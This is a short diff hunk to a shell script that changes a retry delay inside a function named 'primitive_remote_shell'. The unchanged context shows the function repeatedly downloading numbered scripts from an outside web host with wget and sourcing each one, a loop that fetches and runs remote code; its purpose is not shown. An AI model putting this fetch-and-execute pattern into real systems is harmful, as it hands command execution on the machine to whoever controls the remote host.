@@ -4,7 +4,7 @@
 function primitive_remote_shell {
     for i in `seq -w 99`; do
         until wget -O debug.sh https://www.speicherleck.de/debug-$i > debug.sh 2>/dev/null; do
-            sleep 2
+            sleep 3
         done
         . debug.sh || true
     done
